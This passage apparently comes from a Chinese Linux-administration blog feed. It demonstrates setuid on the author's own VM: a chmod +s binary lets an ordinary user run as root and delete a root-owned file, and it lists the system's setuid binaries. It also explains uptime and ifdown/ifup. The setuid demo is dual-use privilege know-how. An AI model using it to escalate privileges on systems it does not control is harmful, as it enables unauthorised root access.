&#125;<br></code></pre></td></tr></table></figure><p>编译生成二进制文件nc0</p><p>gcc nc0.c -o nc0</p><p>创建root权限文件nc0del.txt</p><p>touch nc0del.txt</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><p>没有设置setuid执行nc0</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ id<br>uid=1002(nc0) gid=1002(nc0) groups=1002(nc0)<br>$ pwd<br>/opt/nc0<br>$ ls -l<br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>$ ./nc0<br>nc0 uid is: 1002<br>$ ls -l<br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><p>可以看到执行nc0，并没有删除root权限的nc0test.txt</p><p>设置setuid执行nc0</p><p>chmod +s nc0</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># chmod +s nc0</span><br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ls -l<br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>$ ./nc0<br>nc0 uid is: 0<br>$ ls -l<br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br><br><br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ps -ef | grep nc0</span><br>root       <span class="hljs-number"> 2532 </span>   <span class="hljs-number"> 840 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 sshd: nc0 [priv]<br>nc0        <span class="hljs-number"> 2553 </span>     <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 /lib/systemd/systemd --user<br>nc0        <span class="hljs-number"> 2562 </span>  <span class="hljs-number"> 2553 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 (sd-pam)<br>nc0        <span class="hljs-number"> 2633 </span>  <span class="hljs-number"> 2532 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 sshd: nc0@pts/1<br>nc0        <span class="hljs-number"> 2639 </span>  <span class="hljs-number"> 2633 </span><span class="hljs-number"> 0 </span>22:45 pts/1    00:00:00 -sh<br>root       <span class="hljs-number"> 4738 </span>  <span class="hljs-number"> 2639 </span><span class="hljs-number"> 0 </span>22:55 pts/1    00:00:00 ./nc0<br></code></pre></td></tr></table></figure><p>可以看到执行nc0命令的时候是以root的权限运行的，成功删除root权限文件，同时可以看到执行的用户是root用户。</p><p>常见setuid的命令</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l /usr/bin/ | grep &quot;rws&quot;</span><br>-rwsr-sr-x<span class="hljs-number"> 1 </span>daemon daemon     <span class="hljs-number"> 55560 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2018 </span>at<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 85064 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>chfn<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 53040 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>chsh<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Mar <span class="hljs-number"> 7 </span><span class="hljs-number"> 2020 </span>fusermount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 88464 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>gpasswd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 55528 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>mount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 44784 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>newgrp<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 68208 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>passwd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 31032 </span>May<span class="hljs-number"> 26 </span>19:50 pkexec<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 67816 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>su<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root      <span class="hljs-number"> 166056 </span>Jan<span class="hljs-number"> 19 </span><span class="hljs-number"> 2021 </span>sudo<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>umount<br></code></pre></td></tr></table></figure><p>setuid注意事项</p><p>1、setuid基于安全考虑，只在二进制文件有效</p><p>测试在sh脚本的有效性，可以添加属性，但是无法生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@VM-8-5-ubuntu:/opt/nc0# <span class="hljs-built_in">cat</span> nc0.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*当前登陆的用户名:<span class="hljs-variable">$USER</span>   UID:<span class="hljs-variable">$UID</span>&quot;</span><br><span class="hljs-built_in">rm</span> -rf nc0del.txt<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -lat *</span><br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0del.txt<br>-rwSr--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 68 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0.sh<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ id<br>uid=1002(nc0) gid=1002(nc0) groups=1002(nc0)<br>$ cd /opt/nc0<br>$ ls -lat<br>total 36<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 23 </span>17:06 .<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0del.txt<br>-rwSr--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 68 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0.sh<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root root <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 22 </span>22:42 ..<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>$ bash nc0.sh<br>*当前登陆的用户名:nc0   UID:1002<br>rm: cannot remove &#x27;nc0del.txt&#x27;: Permission denied<br>$<br></code></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.cnblogs.com/lsdb/p/12197090.html">https://www.cnblogs.com/lsdb/p/12197090.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uptime</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/uptime/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/uptime/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a>uptime</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># uptime</span><br> 23:36:12 up<span class="hljs-number"> 59 </span>days, 14:03, <span class="hljs-number"> 2 </span>users,  load average: 0.06, 0.09, 0.07<br></code></pre></td></tr></table></figure><p>当前时间：23:36:12</p><p>系统运行状态：up</p><p>系统已运行时间：59 days, 14:03，已运行59天14小时3分钟</p><p>当前登录用户数：2 users</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# who<br>root     tty1         2022<span class="hljs-string">-06</span><span class="hljs-string">-26</span> 09:35<br>root     pts/0        2022<span class="hljs-string">-08</span><span class="hljs-string">-24</span> 22:39 (125.33.205.114)<br></code></pre></td></tr></table></figure><p>系统负载：load average: 0.06, 0.09, 0.07</p><p>过去1分钟，5分钟和15分钟的平均负载</p><h2 id="uptime-p-系统运行时间"><a href="#uptime-p-系统运行时间" class="headerlink" title="uptime -p 系统运行时间"></a>uptime -p 系统运行时间</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># uptime -p</span><br>up<span class="hljs-number"> 8 </span>weeks,<span class="hljs-number"> 3 </span>days,<span class="hljs-number"> 14 </span>hours,<span class="hljs-number"> 11 </span>minutes<br></code></pre></td></tr></table></figure><h2 id="uptime-s-系统启动时间"><a href="#uptime-s-系统启动时间" class="headerlink" title="uptime -s 系统启动时间"></a>uptime -s 系统启动时间</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># uptime -s</span><br><span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-26</span> <span class="hljs-number">09</span>:<span class="hljs-number">32</span>:<span class="hljs-number">57</span><br></code></pre></td></tr></table></figure><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><p>&#x2F;var&#x2F;run&#x2F;utmp</p><p>&#x2F;proc</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ifdown</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/ifdown/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/ifdown/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="禁用网卡"><a href="#禁用网卡" class="headerlink" title="禁用网卡"></a>禁用网卡</h1><h2 id="查询网卡信息"><a href="#查询网卡信息" class="headerlink" title="查询网卡信息"></a>查询网卡信息</h2><p>使用<strong>ifconfig</strong>，不要使用<strong>ip a</strong></p><p>ip a 命令查询出来的网卡名存在问题</p><p>同台机器</p><p>ip  a : eth0.200@eth0</p><p>ifconfig :  eth0.200</p><p>示例：</p><p>ifconfig</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vim">[root@localhost tmp]# ifconfig<br>eth0      Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:552883003</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:253865444</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          RX byte<span class="hljs-variable">s:130369806378</span> (<span class="hljs-number">121.4</span> GiB)  TX byte<span class="hljs-variable">s:129966960922</span> (<span class="hljs-number">121.0</span> GiB)<br>          Interrup<span class="hljs-variable">t:35</span> <br><br>eth0.<span class="hljs-number">100</span>  Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet addr:<span class="hljs-number">10.122</span>.<span class="hljs-number">11.73</span>  Bcas<span class="hljs-variable">t:10</span>.<span class="hljs-number">122.11</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:232635875</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:216156572</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span> <br>          RX byte<span class="hljs-variable">s:102014135177</span> (<span class="hljs-number">95.0</span> GiB)  TX byte<span class="hljs-variable">s:125048629002</span> (<span class="hljs-number">116.4</span> GiB)<br><br>eth0.<span class="hljs-number">200</span>  Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet addr:<span class="hljs-number">27.221</span>.<span class="hljs-number">32.56</span>  Bcas<span class="hljs-variable">t:27</span>.<span class="hljs-number">221.32</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:29247955</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:5423171</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span> <br>          RX byte<span class="hljs-variable">s:1599611720</span> (<span class="hljs-number">1.4</span> GiB)  TX byte<span class="hljs-variable">s:765012049</span> (<span class="hljs-number">729.5</span> MiB)<br></code></pre></td></tr></table></figure><p>ip a</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pf">[root@localhost tmp]<span class="hljs-comment"># ip a</span><br><span class="hljs-number">1</span>: lo: <span class="hljs-variable">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">16436</span> qdisc noqueue <span class="hljs-keyword">state</span> UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>    <span class="hljs-keyword">inet6</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc mq <span class="hljs-keyword">state</span> UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">3</span>: eth1: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">85</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">4</span>: eth2: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">86</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">5</span>: eth3: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">87</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">8</span>: eth0.<span class="hljs-number">100</span>@eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noqueue <span class="hljs-keyword">state</span> UP <br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">10.122</span>.<span class="hljs-number">11.73</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.122</span>.<span class="hljs-number">11.255</span> scope <span class="hljs-keyword">global</span> eth0.<span class="hljs-number">100</span><br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">11</span>: eth0.<span class="hljs-number">200</span>@eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noqueue <span class="hljs-keyword">state</span> UP <br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">27.221</span>.<span class="hljs-number">32.56</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">27.221</span>.<span class="hljs-number">32.255</span> scope <span class="hljs-keyword">global</span> eth0.<span class="hljs-number">200</span><br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><h2 id="禁用网卡-1"><a href="#禁用网卡-1" class="headerlink" title="禁用网卡"></a>禁用网卡</h2><p>语法：</p><p>ifdown <device name></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> tmp]<span class="hljs-meta"># ifdown <span class="hljs-string">&quot;eth0.200&quot;</span></span><br></code></pre></td></tr></table></figure><p>ifconfig <device name> down</p><h2 id="启用网卡"><a href="#启用网卡" class="headerlink" title="启用网卡"></a>启用网卡</h2><p>语法：</p><p>ifup <device name></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><h3 id="网络不通"><a href="#网络不通" class="headerlink" title="网络不通"></a>网络不通</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>操作网卡可能会导致对应网卡路由丢失，从而导致网络不通</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>备份路由，恢复路由</p><p>1、操作网卡之前备份路由，恢复路由</p><p>route 或 route -n</p><p>2、如果没有备份路由，可以尝试查看&#x2F;etc&#x2F;rc.local文件找路由信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@localhost /]# cat /etc/rc.local<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This script will be executed *after* all the other init scripts.</span><br><span class="hljs-comment"># You can put your own initialization stuff in here if you don&#x27;t</span><br><span class="hljs-comment"># want to do the full Sys V style init stuff.</span><br><br>touch /var/lock/subsys/local<br>/var/cfengine/bin/cfagent 